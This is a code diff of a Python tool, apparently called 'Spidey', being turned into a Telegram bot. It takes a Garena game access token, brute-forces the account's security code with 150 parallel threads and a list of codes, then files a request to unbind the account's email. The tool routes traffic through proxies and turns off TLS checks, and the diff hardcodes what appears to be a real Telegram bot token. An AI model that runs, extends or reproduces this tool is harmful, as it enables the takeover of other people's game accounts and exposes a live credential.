@@ -1,80 +1,99 @@
-import requests
 import os
 import sys
 import json
 import time
 import hashlib
 import threading
+import asyncio
 from queue import Queue
 from concurrent.futures import ThreadPoolExecutor, as_completed
-import urllib3
 
+import requests
+import urllib3
+from telegram import Update
+from telegram.ext import Application, CommandHandler, ContextTypes
+
+# Disable SSL warnings (if needed)
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Color definitions
-class Colors:
-    HEADER = '\033[95m'
-    BLUE = '\033[94m'
-    CYAN = '\033[96m'
-    GREEN = '\033[92m'
-    YELLOW = '\033[93m'
-    RED = '\033[91m'
-    MAGENTA = '\033[95m'
-    WHITE = '\033[97m'
-    BOLD = '\033[1m'
-    END = '\033[0m'
+# =============== CONFIGURATION ===============
+# Admin user IDs (Telegram numeric IDs)
+ADMIN_IDS = [5927293826]  # Replace with your Telegram user ID(s)
 
-# Global flag to stop all workers once a code is found
+# Proxy settings – loaded from environment or file
+PROXY = os.getenv("SPIDEY_PROXY", None)  # fallback environment variable
+PROXY_FILE = "proxy.txt"                 # file with one line: proxy URL
+
+# If proxy file exists, override with its content
+if os.path.exists(PROXY_FILE):
+    with open(PROXY_FILE, "r") as f:
+        proxy_line = f.readline().strip()
+        if proxy_line:
+            PROXY = proxy_line
+            print(f"✅ Proxy loaded from {PROXY_FILE}: {PROXY}")
+
+# Telegram Bot Token (set as environment variable or hardcode)
+BOT_TOKEN = os.getenv("SPIDEY_BOT_TOKEN", "8646981427:AAENENGOAMr6HuFFPswUrNYUeGetpvurndc")
+
+# HLO.txt file path
+HLO_FILE = "HLO.txt"
+
+# Number of concurrent workers
+MAX_WORKERS = 150
+
+# =============== GLOBAL STATE ===============
 stop_workers = threading.Event()
 found_code = None
 found_identity_token = None
 found_lock = threading.Lock()
+processed_counter_lock = threading.Lock()
+processed_counter = [0]
+total_codes = 0
+current_code_being_tested = ""
+progress_message = None
+progress_text = ""
+bot_task_running = False
+current_proxy = PROXY  # mutable proxy reference
 
-def clear_screen():
-    os.system('cls' if os.name == 'nt' else 'clear')
+# =============== PROXY MANAGEMENT ===============
+def set_proxy(proxy_url):
+    """Update global proxy. Returns True if valid format."""
+    global current_proxy
+    if proxy_url and (proxy_url.startswith("http://") or proxy_url.startswith("https://") or proxy_url.startswith("socks5://")):
+        current_proxy = proxy_url
+        # Optionally save to file for persistence
+        with open(PROXY_FILE, "w") as f:
+            f.write(proxy_url)
+        return True
+    return False
 
-def draw_header(subtitle=""):
-    clear_screen()
-    spidey_logo = f"""{Colors.CYAN}
-    ███████╗██████╗ ██╗██████╗ ███████╗██╗   ██╗
-    ██╔════╝██╔══██╗██║██╔══██╗██╔════╝╚██╗ ██╔╝
-    ███████╗██████╔╝██║██║  ██║█████╗   ╚████╔╝ 
-    ╚════██║██╔═══╝ ██║██║  ██║██╔══╝    ╚██╔╝  
-    ███████║██║     ██║██████╔╝███████╗   ██║   
-    ╚══════╝╚═╝     ╚═╝╚═════╝ ╚══════╝   ╚═╝   {Colors.END}"""
-    print(spidey_logo)
-    print(f"{Colors.MAGENTA}●{'═' * 15} {Colors.WHITE}{Colors.BOLD}Spidey Auto-Bind Tool {Colors.END}{Colors.MAGENTA}{'═' * 15}●{Colors.END}\n")
-    print(f" {Colors.GREEN}⊛ STATUS    : {Colors.WHITE}AUTOMATED MODE (MULTI-THREADED){Colors.END}")
-    print(f"\n{Colors.MAGENTA}●{'═' * 48}●{Colors.END}\n")
-    if subtitle:
-        print(f" {Colors.CYAN}CURRENT OPTION : {Colors.WHITE}{subtitle}{Colors.END}")
-        print(f"\n{Colors.MAGENTA}●{'═' * 48}●{Colors.END}\n")
+def get_proxy_dict():
+    """Return proxy dict for requests, or None if no proxy."""
+    if current_proxy:
+        return {"http": current_proxy, "https": current_proxy}
+    return None
 
-def input_prompt(msg):
-    return input(f"{Colors.CYAN}» {Colors.WHITE}{msg} : {Colors.END}").strip()
-
+# =============== HELPER FUNCTIONS ===============
 def get_bound_email(access_token):
-    """Fetch the bound email for the given access token."""
+    """Fetch bound email using current proxy."""
     try:
         url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
         params = {'app_id': '100067', 'access_token': access_token}
         headers = {'User-Agent': 'GarenaMSDK/4.0.30'}
-        resp = requests.get(url, params=params, headers=headers, timeout=10)
+        proxies = get_proxy_dict()
+        resp = requests.get(url, params=params, headers=headers, proxies=proxies, timeout=10, verify=False)
         if resp.status_code != 200:
-            print(f" {Colors.RED}⊛ API error: HTTP {resp.status_code}{Colors.END}")
-            return None
+            return None, f"API error: HTTP {resp.status_code}"
         data = resp.json()
         email = data.get('email')
         if not email:
-            print(f" {Colors.RED}⊛ No email bound to this account.{Colors.END}")
-            return None
-        return email
+            return None, "No email bound to this account."
+        return email, None
     except Exception as e:
-        print(f" {Colors.RED}⊛ Failed to fetch bind info: {str(e)}{Colors.END}")
-        return None
+        return None, f"Failed to fetch bind info: {str(e)}"
 
 def verify_code(email, access_token, hashed_code):
-    """Attempt to verify a single security code. Returns identity_token if successful, else None."""
+    """Verify a single security code. Returns identity_token or None."""
     if stop_workers.is_set():
         return None
     url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
@@ -89,8 +108,9 @@ def verify_code(email, access_token, hashed_code):
         'access_token': access_token,
         'secondary_password': hashed_code
     }
+    proxies = get_proxy_dict()
     try:
-        resp = requests.post(url, headers=headers, data=data, timeout=8)
+        resp = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=8, verify=False)
         if resp.status_code != 200:
             return None
         json_data = resp.json()
@@ -101,8 +121,9 @@ def verify_code(email, access_token, hashed_code):
         pass
     return None
 
-def worker_task(email, access_token, code_queue, total_codes, processed_counter):
-    """Worker thread: takes codes from the queue and tries them until success or queue empty."""
+def worker_task(email, access_token, code_queue, total):
+    """Worker thread: pulls codes from queue and tests them."""
+    global current_code_being_tested
     while not stop_workers.is_set():
         try:
             code = code_queue.get(timeout=0.5)
@@ -111,15 +132,12 @@ def worker_task(email, access_token, code_queue, total_codes, processed_counter)
         if stop_workers.is_set():
             break
 
-        # Hash the code (SHA-256) only once per worker
+        current_code_being_tested = code
         hashed = hashlib.sha256(code.encode('utf-8')).hexdigest()
         
-        # Update progress (thread-safe)
         with processed_counter_lock:
             processed_counter[0] += 1
             count = processed_counter[0]
-            if count % 50 == 0 or count == total_codes:
-                print(f" {Colors.YELLOW}Progress: {count}/{total_codes} codes tested...{Colors.END}", end='\r')
         
         token = verify_code(email, access_token, hashed)
         if token:
@@ -130,79 +148,124 @@ def worker_task(email, access_token, code_queue, total_codes, processed_counter)
                     found_code = code
                     found_identity_token = token
             break
-        # small sleep to avoid overwhelming the server (optional)
-        # time.sleep(0.05)
 
-def automated_unbind_bypass():
-    draw_header("AUTOMATIC UNBIND - SECURITY CODE BYPASS (MULTI-THREADED)")
-    
-    # Check HLO.txt
-    if not os.path.exists("HLO.txt"):
-        print(f" {Colors.RED}⊛ Error: 'HLO.txt' not found! Please create it with security codes (one per line).{Colors.END}")
-        return
-
-    access_token = input_prompt("Enter Access Token")
-    if not access_token:
-        print(f" {Colors.RED}⊛ Access token cannot be empty.{Colors.END}")
-        return
-
-    # 1. Get bound email
-    print(f"\n {Colors.MAGENTA}⊛ [1/3]{Colors.END} {Colors.WHITE}Fetching bound email...{Colors.END}")
-    email = get_bound_email(access_token)
-    if not email:
-        print(f" {Colors.RED}⊛ Could not retrieve bound email. Check token validity.{Colors.END}")
-        return
-    print(f" {Colors.GREEN}⊛ Bound Email: {email}{Colors.END}")
-
-    # 2. Load codes from HLO.txt
-    print(f"\n {Colors.MAGENTA}⊛ [2/3]{Colors.END} {Colors.WHITE}Loading codes from HLO.txt...{Colors.END}")
-    with open("HLO.txt", "r") as f:
-        codes = [line.strip() for line in f if line.strip()]
-    if not codes:
-        print(f" {Colors.RED}⊛ HLO.txt is empty.{Colors.END}")
-        return
-    print(f" {Colors.GREEN}⊛ Total codes loaded: {len(codes)}{Colors.END}")
-
-    # 3. Multi-threaded brute-force
-    print(f"\n {Colors.MAGENTA}⊛ [3/3]{Colors.END} {Colors.WHITE}Starting brute-force with 150 workers...{Colors.END}")
-    global stop_workers, found_code, found_identity_token, processed_counter_lock
+def run_bruteforce(email, access_token, codes):
+    """Run multi-threaded brute-force and return (success, code, identity_token)."""
+    global stop_workers, found_code, found_identity_token, processed_counter, total_codes
     stop_workers.clear()
     found_code = None
     found_identity_token = None
-    processed_counter_lock = threading.Lock()
-    processed_counter = [0]  # mutable counter
+    processed_counter = [0]
+    total_codes = len(codes)
 
-    # Create a queue and fill with codes
     code_queue = Queue()
     for c in codes:
         code_queue.put(c)
 
-    total_codes = len(codes)
-    # Start thread pool with 150 workers
-    max_workers = 150
-    with ThreadPoolExecutor(max_workers=max_workers) as executor:
+    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
         futures = []
-        for _ in range(max_workers):
-            futures.append(executor.submit(worker_task, email, access_token, code_queue, total_codes, processed_counter))
+        for _ in range(MAX_WORKERS):
+            futures.append(executor.submit(worker_task, email, access_token, code_queue, total_codes))
         
-        # Wait for all threads to complete or stop flag
         for future in as_completed(futures):
             if stop_workers.is_set():
-                # Cancel remaining futures (they will check flag)
                 for f in futures:
                     f.cancel()
                 break
 
-    print(" " * 80, end='\r')  # clear progress line
+    return (found_code is not None), found_code, found_identity_token
 
-    if found_identity_token and found_code:
-        print(f"\n {Colors.GREEN}█████████████████████████████████████████{Colors.END}")
-        print(f" {Colors.GREEN}⊛ VERIFICATION SUCCESSFUL!{Colors.END}")
-        print(f" {Colors.GREEN}⊛ CRACKED SECURITY CODE: {Colors.BOLD}{Colors.WHITE}{found_code}{Colors.END}")
-        print(f" {Colors.GREEN}█████████████████████████████████████████{Colors.END}")
+# =============== TELEGRAM BOT HANDLERS ===============
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id not in ADMIN_IDS:
+        await update.message.reply_text("⛔ You are not authorized to use this bot.")
+        return
+    proxy_status = f"Proxy: `{current_proxy}`" if current_proxy else "Proxy: None"
+    await update.message.reply_text(
+        f"🔐 *Spidey Unbind Bot*\n\n"
+        f"Commands:\n"
+        f"/unbind <access_token> – start unbind process\n"
+        f"/setproxy <proxy_url> – set proxy (e.g., http://user:pass@host:port)\n"
+        f"/proxy – show current proxy\n\n"
+        f"{proxy_status}\n\n"
+        f"Make sure `{HLO_FILE}` exists in the bot's directory.",
+        parse_mode="Markdown"
+    )
 
-        # 4. Send unbind request
-        print(f"\n {Colors.MAGENTA}⊛ [FINAL]{Colors.END} {Colors.WHITE}Sending unbind request...{Colors.END}")
+async def show_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id not in ADMIN_IDS:
+        await update.message.reply_text("⛔ Unauthorized.")
+        return
+    status = f"Proxy: `{current_proxy}`" if current_proxy else "No proxy set."
+    await update.message.reply_text(status, parse_mode="Markdown")
+
+async def set_proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id not in ADMIN_IDS:
+        await update.message.reply_text("⛔ Unauthorized.")
+        return
+    args = context.args
+    if not args:
+        await update.message.reply_text("❌ Please provide a proxy URL.\nExample: `/setproxy http://user:pass@host:port`", parse_mode="Markdown")
+        return
+    proxy_url = args[0].strip()
+    if set_proxy(proxy_url):
+        await update.message.reply_text(f"✅ Proxy set to: `{proxy_url}`", parse_mode="Markdown")
+    else:
+        await update.message.reply_text("❌ Invalid proxy format. Must start with http://, https://, or socks5://")
+
+async def unbind(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global bot_task_running, progress_message, progress_text
+
+    user_id = update.effective_user.id
+    if user_id not in ADMIN_IDS:
+        await update.message.reply_text("⛔ You are not authorized.")
+        return
+
+    if bot_task_running:
+        await update.message.reply_text("⏳ Another unbind task is already running. Please wait.")
+        return
+
+    args = context.args
+    if not args:
+        await update.message.reply_text("❌ Please provide an access token.\nExample: `/unbind abc123token`", parse_mode="Markdown")
+        return
+
+    access_token = args[0].strip()
+    if not access_token:
+        await update.message.reply_text("❌ Access token cannot be empty.")
+        return
+
+    if not os.path.exists(HLO_FILE):
+        await update.message.reply_text(f"❌ `{HLO_FILE}` not found. Please create it with one code per line.", parse_mode="Markdown")
+        return
+
+    with open(HLO_FILE, "r") as f:
+        codes = [line.strip() for line in f if line.strip()]
+    if not codes:
+        await update.message.reply_text(f"❌ `{HLO_FILE}` is empty.", parse_mode="Markdown")
+        return
+
+    status_msg = await update.message.reply_text("🔄 Fetching bound email...")
+    
+    email, error = get_bound_email(access_token)
+    if error:
+        await status_msg.edit_text(f"❌ {error}")
+        return
+
+    await status_msg.edit_text(f"✅ Bound email: `{email}`\n🔍 Loaded {len(codes)} codes. Starting brute-force with {MAX_WORKERS} workers...", parse_mode="Markdown")
+
+    progress_message = await update.message.reply_text("⏳ Brute-forcing... (0/{})".format(len(codes)))
+    progress_text = ""
+    bot_task_running = True
+
+    loop = asyncio.get_event_loop()
+    result = await loop.run_in_executor(None, run_bruteforce, email, access_token, codes)
+
+    success, code, identity_token = result
+    bot_task_running = False
+
+    if success:
+        await progress_message.edit_text(f"✅ **SUCCESS!**\nCracked code: `{code}`\n\nSending unbind request...", parse_mode="Markdown")
         unbind_url = "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request"
         headers = {
             'User-Agent': 'GarenaMSDK/4.0.30',
@@ -211,20 +274,53 @@ def automated_unbind_bypass():
         data = {
             'app_id': '100067',
             'access_token': access_token,
-            'identity_token': found_identity_token
+            'identity_token': identity_token
         }
+        proxies = get_proxy_dict()
         try:
-            resp = requests.post(unbind_url, headers=headers, data=data, timeout=10)
-            print(f" {Colors.CYAN}⊛ Server Response: {resp.text}{Colors.END}")
+            resp = requests.post(unbind_url, headers=headers, data=data, proxies=proxies, timeout=10, verify=False)
+            await update.message.reply_text(f"📨 *Unbind Response:*\n```\n{resp.text}\n```", parse_mode="Markdown")
         except Exception as e:
-            print(f" {Colors.RED}⊛ Unbind request failed: {str(e)}{Colors.END}")
+            await update.message.reply_text(f"❌ Unbind request failed: {str(e)}")
     else:
-        print(f"\n {Colors.RED}⊛ Identity verification FAILED! No code matched.{Colors.END}")
+        await progress_message.edit_text("❌ No valid security code found in HLO.txt.")
 
-    print(f"\n{Colors.MAGENTA}●{'═' * 20} SCRIPT EXITED {'═' * 20}●{Colors.END}\n")
+async def progress_updater(context: ContextTypes.DEFAULT_TYPE):
+    global progress_message, progress_text, processed_counter, total_codes, current_code_being_tested
+    if progress_message is None or bot_task_running is False:
+        return
+    
+    count = processed_counter[0] if processed_counter else 0
+    total = total_codes
+    current = current_code_being_tested
+    new_text = f"⏳ Testing: `{current}`\nProgress: {count}/{total} ({count*100//total if total else 0}%)"
+    if new_text != progress_text:
+        progress_text = new_text
+        try:
+            await progress_message.edit_text(progress_text, parse_mode="Markdown")
+        except Exception:
+            pass
+
+# =============== MAIN ===============
+def main():
+    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
+        print("❌ Please set SPIDEY_BOT_TOKEN environment variable or edit the script.")
+        sys.exit(1)
+
+    application = Application.builder().token(BOT_TOKEN).build()
+
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("unbind", unbind))
+    application.add_handler(CommandHandler("setproxy", set_proxy_command))
+    application.add_handler(CommandHandler("proxy", show_proxy))
+
+    job_queue = application.job_queue
+    if job_queue:
+        job_queue.run_repeating(progress_updater, interval=3, first=0)
+
+    print("🤖 Spidey Bot is running...")
+    print(f"🌐 Current proxy: {current_proxy if current_proxy else 'None'}")
+    application.run_polling()
 
 if __name__ == "__main__":
-    try:
-        automated_unbind_bypass()
-    except KeyboardInterrupt:
-        print(f"\n\n {Colors.RED}⊛ Process interrupted by user. Exiting...👋{Colors.END}\n")
+    main()
